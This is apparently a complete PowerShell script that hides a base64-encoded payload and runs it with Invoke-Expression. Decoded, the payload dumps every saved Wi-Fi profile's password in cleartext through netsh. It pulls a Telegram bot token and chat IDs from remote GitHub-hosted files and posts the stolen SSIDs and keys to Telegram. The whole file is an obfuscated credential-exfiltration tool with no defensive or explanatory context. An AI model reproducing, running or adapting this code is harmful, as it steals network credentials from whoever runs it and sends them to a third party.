$encodedScript = 'ZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgID0gJ05vbWJyZSBkZSBTU0lEJw0KICAgICAgICAgICAgJ2F1dGhlbnRpY2F0aW9uX3RleHQnICAgID0gJ0F1dGVudGljYWNpw7NuJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgID0gJ0NpZnJhZG8nDQogICAgICAgICAgICAna2V5X3RleHQnICAgICAgICAgICAgICAgPSAnQ29udGVuaWRvIGRlIGxhIGNsYXZlJw0KICAgICAgICB9DQogICAgICAgICdlbi1FTicgPSBAew0KICAgICAgICAgICAgJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnID0gJ1Byb2ZpbGUgbm90IGZvdW5kJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgID0gJ1NTSUQgbmFtZScNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICA9ICdBdXRoZW50aWNhdGlvbicNCiAgICAgICAgICAgICdlbmNyeXB0aW9uX3RleHQnICAgICAgICA9ICdDaXBoZXInDQogICAgICAgICAgICAna2V5X3RleHQnICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIEdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICBpZiAoJGlucHV0VGV4dCAtbWF0Y2ggIlxiJG5hbWVTdHJpbmdcYiIpIHsNCiAgICAgICAgICAgIHJldHVybiAkaW5wdXRUZXh0IC1yZXBsYWNlICJeW146XSo6ICIsIiIgLXJlcGxhY2UgJ1xzKiQnDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICIiDQogICAgfQ0KDQogICAgJFdMQU5fUHJvZmlsZXMgPSBAKCkNCiAgICANCiAgICAjIE9idGVuZXIgcGVyZmlsZXMgV0xBTg0KICAgIG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHdsYW5fUHJvZmlsZSA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlICRfIGtleT1jbGVhcg0KDQogICAgICAgIGlmICgkd2xhbl9Qcm9maWxlIC1jb250YWlucyAkTEFOR1sncHJvZmlsZV9ub3RfZm91bmRfdGV4dCddKSB7DQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgfQ0KDQogICAgICAgICRJbnRlcmZhY2VOYW1lID0gR2V0VmFsdWVCeU5hbWUgJHdsYW5fUHJvZmlsZSAkTEFOR1snc3NpZF9uYW1lX3RleHQnXQ0KDQogICAgICAgIGlmICgkSW50ZXJmYWNlTmFtZSkgew0KICAgICAgICAgICAgJEludGVyZmFjZU5hbWUgPSAkSW50ZXJmYWNlTmFtZS5UcmltKCciJykNCiAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6R2V0RW5jb2RpbmcoIklTTy04ODU5LTEiKS5HZXRCeXRlcygkSW50ZXJmYWNlTmFtZSkpDQoNCiAgICAgICAgICAgICRXTEFOX1Byb2ZpbGVzICs9IFtQU0N1c3RvbU9iamVjdF1Aew0KICAgICAgICAgICAgICAgIFNTSUQgPSAkSW50ZXJmYWNlTmFtZQ0KICAgICAgICAgICAgICAgIEF1dGhlbnRpY2F0aW9uID0gKEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ2F1dGhlbnRpY2F0aW9uX3RleHQnXSkgLXJlcGxhY2UgJ1woLipcKScNCiAgICAgICAgICAgICAgICBFbmNyeXB0aW9uID0gKEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ2VuY3J5cHRpb25fdGV4dCddKSAtcmVwbGFjZSAnXCguKlwpJw0KICAgICAgICAgICAgICAgIEtleSA9IEdldFZhbHVlQnlOYW1lICR3bGFuX1Byb2ZpbGUgJExBTkdbJ2tleV90ZXh0J10NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkV0xBTl9Qcm9maWxlcy5Db3VudCAtZ3QgMCkgew0KICAgICAgICAkV0xBTl9Qcm9maWxlcw0KICAgIH0gZWxzZSB7DQogICAgICAgIFdyaXRlLU91dHB1dCAnTm8gc2UgZW5jb250cmFyb24gcGVyZmlsZXMgV0xBTi4nDQogICAgfQ0KfQ0KDQojIEZ1bmN0aW9uIHRvIHNlbmQgYSBtZXNzYWdlIHRvIFRlbGVncmFtDQpmdW5jdGlvbiBTZW5kLVRlbGVncmFtTWVzc2FnZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR0b2tlbiwNCiAgICAgICAgW3N0cmluZ10kY2hhdElkLA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KDQogICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlIg0KDQogICAgJHBhcmFtcyA9IEB7DQogICAgICAgIGNoYXRfaWQgPSAkY2hhdElkDQogICAgICAgIHRleHQgICAgPSAkbWVzc2FnZQ0KICAgIH0NCg0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtTWV0aG9kIFBvc3QgLUJvZHkgJHBhcmFtcw0KfQ0KDQojIE9idGVuZXIgcGVyZmlsZXMgV0xBTg0KJHJlc3VsdCA9IEdldC1XTEFOX1Byb2ZpbGVzDQoNCmlmICgkcmVzdWx0LkNvdW50IC1ndCAwKSB7DQogICAgIyBDb25maWd1cmFjacOzbiBkZSBUZWxlZ3JhbQ0KICAgICR0b2tlbkNvbmZpZyA9IEdldC1Db250ZW50ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy9jb25maWcyLnR4dCINCiAgICAkY2hhdElkcyA9IEdldC1Db250ZW50ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vUGVyaWNlbmEvaGFwcHliaXJ0aGRheS5naXRodWIuaW8vbWFpbi9kYXRvcy91c3VhcmlvL2x1aXNoaW5vLnR4dCINCg0KICAgICMgQ29uc3RydWlyIG1lbnNhamUgcGFyYSBUZWxlZ3JhbQ0KICAgICRyZXN1bHRNZXNzYWdlID0gIlRvdGFsIFdMQU5fUHJvZmlsZXM6ICQoJHJlc3VsdC5Db3VudClgcmBuUGFzc3dvcmQgV2lGaSBlbmNvbnRyYWRhczpgcmBuIg0KDQogICAgJHJlc3VsdCB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gImByYG5TU0lEOiAkKCRfLlNTSUQpYHJgbkF1dGhlbnRpY2F0aW9uOiAkKCRfLkF1dGhlbnRpY2F0aW9uKWByYG5FbmNyeXB0aW9uOiAkKCRfLkVuY3J5cHRpb24pYHJgblBhc3N3b3JkOiAkKCRfLktleSlgcmBuIg0KICAgIH0NCg0KICAgICRyZXN1bHRNZXNzYWdlICs9ICJgcmBuQXV0b3I6IEx1aXNoaW5vIFBlcmljZW5hYHJgbk1hcyBpbmZvcm1hY2lvbjogW0Jsb2ddKGh0dHBzOi8vbHBlcmljZW5hLmJsb2dzcG90LmNvbS8pYHJgbmByYG4iDQoNCiAgICAjIEVudmlhciBtZW5zYWplIGEgY2FkYSBjaGF0IElEDQogICAgZm9yZWFjaCAoJGNoYXRJZCBpbiAkY2hhdElkcykgew0KICAgICAgICBTZW5kLVRlbGVncmFtTWVzc2FnZSAtdG9rZW4gJHRva2VuQ29uZmlnIC1jaGF0SWQgJGNoYXRJZCAtbWVzc2FnZSAkcmVzdWx0TWVzc2FnZQ0KICAgIH0NCn0NCg0K'
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
